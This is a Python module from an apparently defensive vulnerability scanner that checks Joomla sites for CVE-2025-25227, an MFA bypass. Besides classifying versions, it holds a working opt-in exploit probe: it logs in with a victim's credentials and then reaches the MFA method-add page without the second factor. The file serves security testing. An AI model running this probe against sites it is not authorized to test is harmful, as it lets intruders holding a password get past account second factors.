from __future__ import annotations

import re
from typing import Any

from ...core.args import aggressive_value
from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_required, parse_version_safe

CVE_ID = "CVE-2025-25227"
NAME = "Joomla core MFA bypass through the methods management page"
COMPONENT = "Joomla core com_users MFA"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["4.0.0-4.4.12", "5.0.0-5.2.5"]
AFFECTED_RULE = "Joomla 4.0.0-4.4.12 and 5.0.0-5.2.5; requires the victim password"
FIXED_RULE = "Update to Joomla 4.4.13, 5.2.6, or newer"
LOGIN_PAGE = "/index.php/component/users/login?Itemid=101"
PROFILE = "/index.php?option=com_users&view=profile"
ADD_METHOD = "/index.php?option=com_users&task=method.add"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parse_version_required("4.0.0") <= parsed < parse_version_required("4.4.13"):
        return "LIKELY_VULNERABLE"
    if parse_version_required("5.0.0") <= parsed < parse_version_required("5.2.6"):
        return "LIKELY_VULNERABLE"
    if parsed < parse_version_required("4.0.0"):
        return "NOT_AFFECTED"
    return "PATCHED"


def passive_result(joomla_version: str | None) -> Finding:
    status = classify_version(joomla_version)
    confidence = "HIGH" if status in {"LIKELY_VULNERABLE", "PATCHED", "NOT_AFFECTED"} else "MEDIUM"
    details = {
        "LIKELY_VULNERABLE": (
            f"Joomla {joomla_version} treats every MFA management page as exempt from the captive "
            "redirect; verify that task=method.add is reachable while MFA is pending."
        ),
        "PATCHED": f"Joomla {joomla_version} only exempts the captive page while MFA is pending.",
        "NOT_AFFECTED": f"Joomla {joomla_version} predates the affected MFA handler.",
        "INCONCLUSIVE": "Joomla was detected, but the core version could not be determined.",
    }
    return Finding(
        cve=CVE_ID, name=NAME, status=status, confidence=confidence,
        component=COMPONENT, component_version=joomla_version, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=details[status],
        action="Upgrade to Joomla 4.4.13, 5.2.6, or newer and review MFA method changes.",
    )


def _token(page: str) -> str | None:
    match = re.search(r'name="([a-f0-9]{32})" value="1"', page)
    return match.group(1) if match else None


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    victim_user: str | None = None,
    victim_password: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    if not victim_user or not victim_password:
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=False,
            proof_url=f"{base}{LOGIN_PAGE}",
            detail="The probe needs an MFA-enrolled account via --aggressive-arg victim_user=... victim_password=...; nothing was sent.",
            action="Re-run with lab victim credentials on an authorized target.",
        )
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    login_page = client.get(f"{base}{LOGIN_PAGE}", timeout=timeout)
    token = _token(login_page.get("body", "") or "")
    if not token:
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{LOGIN_PAGE}",
            detail="The frontend login form was not available.",
            action="Verify the frontend login route and credentials.",
        )
    client.request(
        f"{base}/index.php?option=com_users&task=user.login",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({
            "username": victim_user, "password": victim_password,
            "remember": "0", "return": "", token: "1",
        }),
        timeout=timeout, follow_redirects=False,
    )
    profile = client.get(f"{base}{PROFILE}", timeout=timeout)
    profile_final = str(profile.get("final_url") or "")
    profile_captive = "captive" in profile_final.lower()
    methods = client.get(f"{base}{ADD_METHOD}", timeout=timeout)
    methods_final = str(methods.get("final_url") or "")
    methods_captive = "captive" in methods_final.lower()
    methods_ui = methods.get("status") in (200, 500)
    evidence: dict[str, object] = {
        "victim_user": victim_user,
        "profile_final": profile_final,
        "profile_captive": profile_captive,
        "methods_final": methods_final,
        "methods_status": methods.get("status"),
        "methods_captive": methods_captive,
        "methods_ui": methods_ui,
    }
    if profile_captive and not methods_captive and methods_ui:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{ADD_METHOD}",
            evidence=evidence,
            detail=(
                "After the password login the profile request was redirected to the captive MFA page, "
                "but the MFA method-add task (task=method.add) was reachable directly. "
                "The page exposes the victim's MFA methods and the add/delete controls without the "
                "second factor having been completed."
            ),
            action=(
                "Upgrade to Joomla 4.4.13, 5.2.6, or newer (only the captive page is exempt while "
                "MFA is pending) and review MFA method changes."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{ADD_METHOD}",
        evidence=evidence,
        detail=(
            "The methods page did not bypass the captive redirect "
            f"(profile_captive={profile_captive}, methods_captive={methods_captive}, ui={methods_ui})."
        ),
        action="Verify Joomla runs 4.4.13, 5.2.6, or newer.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_result(joomla_version)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only methods-page proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        victim_user=aggressive_value(aggressive_args, aggressive_command, "victim_user"),
        victim_password=aggressive_value(aggressive_args, aggressive_command, "victim_password"),
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Authentication Bypass",
        "module_version": "1.0.0", "last_reviewed": "2026-11-12", "updated": "2026-11-12",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2025-25227",
            "https://developer.joomla.org/security-centre/964-20250402-core-mfa-authentication-bypass.html",
        ],
    }
